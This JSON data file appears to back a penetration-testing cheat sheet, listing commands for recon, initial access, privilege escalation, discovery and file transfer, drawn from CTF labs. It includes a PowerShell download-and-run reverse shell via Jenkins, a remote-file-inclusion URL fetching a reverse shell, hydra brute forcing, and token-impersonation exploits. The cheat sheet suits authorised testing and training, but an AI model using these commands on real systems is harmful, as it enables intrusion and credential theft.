{
    "recon":
    [
        {   
            "command": "nmap -sC -sV -oA [name] [address]",
            "section": "Recon",
            "description": "This will save the results in three file formats: '.nmap', '.gmap', and '.xml' (The '.nmap' file will store the output as you would normally see it on the terminal.)"
        },
        {
            "command": "nmap -p- -sC -sV -oA [name] [address]",
            "section": "Recon",
            "description": "Similar to the basic nmap scan except it will check all ports, the '-oA' will save it in the three main file formats, you don't have to include this."
        },
        {
            "command": "smbmap -H [IP]<br><br>or<br><br> smbmap -H [IP] -d [domain]",
            "section": "Recon",
            "description": "Enumerate available SMB shares, default port is 139. For the IP address, you don't have to indicate the port, just put the IP address. If you get 'Authentication Error on IP' try adding a fake user flag of '-u notarealuser'"
        },
        {
            "command": "nmap --script smb-enum-shares.nse -p139,445 [IP]",
            "section": "Recon",
            "description": "Enumerate available SMB shares on port 139 and 445 using nmap scripts."
        },
        {
            "command": "smbclient -L [IP]",
            "section": "Recon",
            "description": "Enumerate available SMB shares using smbclient."
        },
        {
            "command": "dirb [url] [wordlist]",
            "section": "Recon",
            "description": "Can also utilize the GUI version dirbuster (though I find that to be slower)."
        },
        {
            "command": "gobuster dir -u [address] -w [wordlist] -o [name] -t [threads]",
            "section": "Recon",
            "description": "On Kali Linux, wordlists stored under /usr/share/wordlists/. In the example, the '-o' and the '-t' flags are not necessasry."
        },
        {
            "command": "wfuzz --hc 404 -Z -w [wordlist] -u [domain]/FUZZ/[file name]",
            "section": "Recon",
            "description": "This situation/example was from a HackTheBox challenge (Obscurity) where it was discovered that there was a file named 'SuperSecureServer.py' in some unknown directory. In this case, I used wfuzz to find what the directory name is. It will replace 'FUZZ' with every word in the wordlists."
        },
        {
            "command": "wfuzz --sc 200 -w [wordlist] -H \"Host: FUZZ.[domain]\" -u [domain]",
            "section": "Recon",
            "description": "Needs to have the quotation marks."
        },
        {
            "command": "python3 sublist3r.py -d [domain]",
            "section": "Recon",
            "description": "Needs to be installed: sudo git clone https://github.com/aboul3la/Sublist3r /opt/sublist3r"
        },
        {
            "command": "enum4linux [address]",
            "section": "Recon",
            "description": "The output is pretty noisy, recommend outputing to file."
        },
        {
            "command": "wpscan --url [address] --enumerate u",
            "section": "Recon",
            "description": "Enumerate users on a WordPress website."
        },
        {
            "command": "wpscan --url [address] --enumerate p",
            "section": "Recon",
            "description": "Enumerate plugins on a WordPress website."
        }
    ],
    
    "init":
    [
        {
            "command": "hydra -l [username] -P [password list] [ip address (only ip)] http-post-form \"[post uri]:[Request Body]:[string that displays failed attempt]\"",
            "section": "Initial Access",
            "description": "Using hydra to brute force a login web page. Use BurpSuite and test a random user/pass combination to get a request body. The post URI is at the top of the intercepted request in BurpSuite (starts line 1 after POST). Within the request portion, you should see where you tested a login combination. Replace the username you guessed with ^USER^ and the password you guessed with ^PASS^. The request body is the very bottom part."
        },
        {
            "command": "Remote/local file inclusion<br><br>RFI example: https://10.10.190.157/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.13.22.171/php-reverse-shell.php<br><br>LFI example: https://10.10.190.157/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../etc/passwd",
            "section": "Initial Access",
            "description": "Remote file inclusion is when you can include a remote file for malicious purposes. If RFI is possible, you can reference it in the URL for the webpage to load. An attacker can run a webserver with a reverse shell script for the victim's webpage to load.<br><br>LFI is similar but only references local files on the victim server. This means that it is possible to view files in the victim's filesystem."
        },
        {
            "command": "smbclient \\\\[IP]\\[share]",
            "section": "Initial Access",
            "description": "Access a SMB share that you have access to. Remember to account for escape characters in bash. Might need to add two backslashes before the IP address and one one before the share name."
        },
        {
            "command": "groovy> cmd = \"powershell iex (New-Object Net.WebClient).DownloadString('[attacker ip]:[attacker web port]/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [attacker ip] -Port [attacker listening port]\"<br><br>groovy> cmd.execute()",
            "section": "Initial Access",
            "description": "If you have access to the Jenkins webpage (requires login) you can get to the script console page. This page will execute groovy commands which can be utilized to perform remote code execution. By utilizing nishang powershell scripts (specifically the reverse shell module Invoke-PowerShellTcp.ps1), you can load the script and execute it to gain initial access. The above command requires the attacker machine to have a webserver running with nishang's Invoke-PowerShellTcp.ps1 module."
        },
        {
            "command": "winrs -r:192.168.1.9 -u:[domain\\user] -p:[password] [command]",
            "section": "Initial Access",
            "description": "Run arbitrary commands if WinRM is open."
        }
    ],

    "privesc":
    [
        {
            "command": "GetUserSPNs.py -request -dc-ip [ip] [domain name]/[user][password]",
            "section": "Privilege Escalation",
            "description": "[Windows] Performs a kerberoast attack using the Impacket toolkit. This requires you to have an authorized username and password and for active directory to be enabled on the victim machine. "
        },
        {
            "command": "runas /savecred /user:[escalated user] \"[exe path]\"",
            "section": "Privilege Escalation",
            "description": "[Windows] If you see that runas /savecred is available or have identified stored credentials for a privileged user, you can run commands as that privileged user without supplying a password. Generate a reverse shell using msfvenom, upload to victim system, and run it using the runas command."
        },
        {
            "command": "JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t *",
            "section": "Privilege Escalation",
            "description": "[Windows] This is a type of a token impersonation attack. From the JuicyPotato github, JuicyPotato \"leverages the privilege escalation chain based on BITS service having the MiTM listener on 127.0.0.1:6666 and when you have SeImpersonate or SeAssignPrimaryToken privileges.\" Having the SeImpersoante or SeAssignPrimaryToken privileges is the important part. Check the github for more information."
        },
        {
            "command": "PrintSpoofer64.exe -i -c cmd",
            "section": "Privilege Escalation",
            "description": "[Windows] Windows has a feature that allows service accounts to access the system user via these privileges/tokens - this is a type of a token impersonation attack. For PrintSpoofer, THE ONLY REQUIRED PRIVILEGE IS 'SeImpersonatePrivilege'. PrintSpoofer has been tested on Windows 10 and Windows Server 2016/2019 - it may work on older version of windows according to the PrintSpoofer github."
        },
        {
            "command": "GTFObins",
            "section": "Privilege Escalation",
            "description" : "[Windows][Linux] Check the GTFOBins website and find executables that you can run as a higher level user. This website contains a curated list of binaries that can produce a shell."
        },
        {
            "command": "Tar Wildcard Exploit",
            "section": "Privilege Escalation",
            "description": "[Linux] Wildcard exploit happens when a command utilizes a wildcard (such as *). When a wildcard in a command is used (such as cat *), it will execute that command on every file. So for example, if there are 3 text files named 1.txt, 2.txt, and -help and you do cat *.txt, it will technically execute cat 1.txt, cat 2.txt, and cat -help. Certain commands are exploitable by achieving remote code execution. <br><br>For tar, tar has two switches --chechpoint=[number] and --checkpoint-action=[ACTION]. Once a checkpoint is reached, it will perform the specified action. You can name files as these two switches to achieve code execution. Research tar wildcard exploit on google to read more."
        },
        {
            "command": "sudo -l",
            "section": "Privilege Escalation",
            "description": "[Linux] This checks for sudo commands that can be run without supplying a password. Can potentially be paired with GTFOBins."
        }
    ],

    "discovery":
    [
        {
            "command": "arp -a",
            "section": "Discovery",
            "description" : "Check network configuration/see recently connected systems."
        },
        {
            "command": "whoami /priv <br><br> whoami /all",
            "section": "Discovery",
            "description": "[Windows] View user security privileges. '/all' will display all information in the current access token, including the current user name, security identifiers (SID), privileges, and groups that the current user belongs to. <br><br> According to TryHackMe, the most commonly abused privileges are: <br>-SeImpersonatePrivilege <br>-SeAssignPrimaryPrivilege <br>-SeTcbPrivilege <br>-SeBackupPrivilege <br>-SeRestorePrivilege <br>-SeCreateTokenPrivilege <br>-SeLoadDriverPrivilege <br>-SeTakeOwnershipPrivilege <br>-SeDebugPrivilege <br><br> THE TWO MAIN ONES TO CHECK FOR ARE 'SeImpersonatePrivilege' OR 'SeAssignPrimaryToken'! \"If you have SeAssignPrimaryToken or SeImpersonate privilege, you are SYSTEM.\" If you see these enabled check the JuicyPotato and PrintSpoofer commands in the privesc section."
        },
        {
            "command": "PS> Get-NetComputer -fulldata | select operatingsystem",
            "section": "Discovery",
            "description": "Get a list of all operating systems on the domain."
        },
        {
            "command": "PS> Get-NetUser | select cn",
            "section": "Discovery",
            "description": "Get a list of all users on the domain."
        },
        {
            "command": "PS> Get-NetGroup",
            "section": "Discovery",
            "description": "Get a list of all groups on the domain."
        },
        {
            "command": "net user [user]",
            "section": "Discovery",
            "description": "[Windows] Gets information on the user, can be utilized to check what groups a user is in. Groups will be listed under Global Group Memberships and/or Local Group Memberships"
        },
        {
            "command": "cmdkey /list",
            "section": "Discovery",
            "description": "[Windows] Identify stored credentials. If you see a priviliged level user (admin/administrator), check the corresponding runas command in the privesc section."
        },
        {
            "command": "Get-ADGroupMember [AD Group] | select name",
            "section": "Discovery",
            "description": "[Windows] PowerShell command that gets all members of the AD (Active Directory) group, then from that list only output the names."
        },
        {
            "command": "PowerView Setup",
            "section": "Discovery",
            "description": "[Windows]. PowerView is a powershell tool to assist with the discovery phase of a Windows Active Directory Network. <br><br> 1. Get PowerView.ps1 (on github) to the victim machine <br><br> 2. Load powershell shell with execution policy bypassed 'powershell -ep bypass' <br><br> 3. Import the PowerView module '. .\\PowerView.ps1'"
        },
        {
            "command": "PowerView Cheatsheet",
            "section": "Discovery",
            "description": "Check out this PowerView cheatsheet by HarmJ0y (the creator of PowerView) https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993"
        },
        {
            "command": "Using winPEAS",
            "section": "Discovery",
            "description": "[Windows] WinPEAS is exclusive to Windows - linPEAS is the linux equiavlent. There is x86 and x64 versions available, do the 'systeminfo' command on cmd.exe to see the computer architecture. There is a lot of output, so would recommend outputting to a file."
        },
        {
            "command": "Using windows-exploit-suggester",
            "section": "Discovery",
            "description": "[Windows]<br>1. On the (victim) windows shell, do 'systeminfo' and save the output. <br><br> 2. On the kali (attacker) system, do 'python windows-exploit-suggester.py --update'. This should output an xls or xlsx file. <br><br> 3. (Might have to do 'pip install xlrd') Then do 'python windows-exploit-suggester.py --database [.xls file] --systeminfo [systeminfo file]'. From their github page: \"This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins.\""
        },
        {
            "command": "Check /etc/passwd",
            "section": "Discovery",
            "description": "[Linux] Check the /etc/passwd file for the list o users that are present on the system."
        },
        {
            "command": "Check /etc/crontab",
            "section": "Discovery",
            "description": "[Linux] Check the /etc/crontab file to view scheduled tasks running on the system."
        },
        {
            "command": "find [directory] -user [user] 2>&1 | grep -v \"Permission denied\"",
            "section": "Discovery",
            "description": "[Linux] Finds all files starting from the directory supplied that is owned by the user. The output is piped to a grep -v command to exclude files that are flagged as permission denied."
        },
        {
            "command": "find [directory] -group [group] 2>&1 | grep -v \"Permission denied\"",
            "section": "Discovery",
            "description": "[Linux] Finds all files starting from the directory supplised that is owned by the group. The output is piped to a grep -v command to exclude files that are flagged as permission denied."
        },
        {
            "command": "find / -perm -4000 -o -perm -2000 -ls 2>/dev/null",
            "section": "Discovery",
            "description": "[Linux] Search for SETUID (-4000) or SETGID (-2000) bit set."
        },
        {
            "command": "find /etc -perm -2",
            "section": "Discovery",
            "description": "[Linux] Check writeable config files."
        },
        {
            "command": "find /home -name .bash_history -perm -4 2>/dev/null",
            "section": "Discovery",
            "description": "[Linux] Check readable bash history files."
        },
        {
            "command": "grep -Inri passw /etc/* 2>/dev/null",
            "section": "Discovery",
            "description": "[Linux] Check files in /etc/ that have the string passw."
        },
        {
            "command": "lsof -Pni",
            "section": "Discovery",
            "description": "[Linux] Check network/recently connected systems."
        },
        {
            "command": "netstat -tulp",
            "section": "Discovery",
            "description": "[Linux] Utilizes the netstat command to look for tcp (the t in the command) and udp (the u in the command) ports that are listening (l) and prints output with program names (p)."
        },
        {
            "command": "ssh -L localhost:[local port]:[victim ip]:[victim port] [name]@[victim ip]",
            "section": "Discovery",
            "description": "Reverse SSH tunnel to an internal webpage used by victim. Upon doing this command you can visit the webpage on your local (attacker) machine by going to the port you used in the [local port] portion. Tunnels traffic on victim port to attacker ip/port via SSH."
        },
        {
            "command": "findstr /S cpassword %LOGONSERVER%\\sysvol\\*.xml",
            "section": "Discovery",
            "description": "[Windows] Check sysvol for GPP passwords (can be decrypted since key is public)."
        },
        {
            "command": "ipconfig /displaydns",
            "section": "Discovery",
            "description": "[Windows] Check recently connected systems."
        },
        {
            "command": "netstat -na",
            "section": "Discovery",
            "description": "[Windows] Check recently connected systems."
        },
        {
            "command": "net group \"Domain Admins\" /domain",
            "section": "Discovery",
            "description": "[Windows] List all users in the domain admin group Domain Admins."
        },
        {
            "command": "net group /domain",
            "section": "Discovery",
            "description": "[Windows] List all groups in domain."
        },
        {
            "command": "net localgroup",
            "section": "Discovery",
            "description": "[Windows] List local groups."
        },
        {
            "command": "net localgroup administrators",
            "section": "Discovery",
            "description": "[Windows] List members of a local admin group."
        },
        {
            "command": "net user",
            "section": "Discovery",
            "description": "[Windows] List local users."
        },
        {
            "command": "net user /domain",
            "section": "Discovery",
            "description": "[Windows] Check domain users."
        },
        {
            "command": "netsh advfirewall show allprofiles",
            "section": "Discovery",
            "description": "[Windows] See whole configuration of built-in Windows firewall."
        }
    ],

    "file":
    [
        {
            "command": "cat [file] | base64<br><br>echo \"[base64 output]\" | base64 -d > file",
            "section": "Exfiltration/File Movement",
            "description": "Convert file/executable to base64, then to download it decode the base64 and output to file."
        },
        {
            "command": "powershell -c \"Invoke-WebRequest [attacker ip]:[attacker web port]/[file] -OutFile [file]\"",
            "section": "Exfiltration/File Movement",
            "description": "[Windows] Uses PowerShell to download a file to the victim system."
        },
        {
            "command": "certutil.exe -urlcache -f [address] [output name]",
            "section": "Exfiltration/File Movement",
            "description": "[Windows] Download files to the victim system using native OS binary on command prompt."
        },
        {
            "command": "ftp> get \"[file name]\"",
            "section": "Exfiltration/File Movement",
            "description": "Downloads files from an FTP server. It’s important to distinguish if you need to utilize FTP’s ASCII mode or Binary mode as initially when connecting to a FTP server, ASCII mode is the default mode. To change mode you can simply type 'binary' in the FTP shell. File types to use ASCII mode: txt, asp, html, php (generally text-based files such as source code, web pages, etc). File types to use binary mode: jpg, gif, wav, mp3, mp4, zip, tar, exe, pdf, mdb (generally image files, sound files, video files, archive files, etc)."
        },
        {
            "command": "mount //[ip]/[share] [local location] -o username=[user] <br><br>unmount [local location]",
            "section": "Exfiltration/File Movement",
            "description": "Mount/unmount an smb share to the local file system."
        },
        {
            "command": "net use * \\\\[target]\\[share] [password] /u:[user]",
            "section": "Exfiltration/File Movement",
            "description": "Mount a share on a target. Do 'net use * /del' to drop all SMB sessions."
        },
        {
            "command": "net use \\[target] [password] /u:[user]",
            "section": "Exfiltration/File Movement",
            "description": "Set up a SMB session with credentials."
        }
    ]
}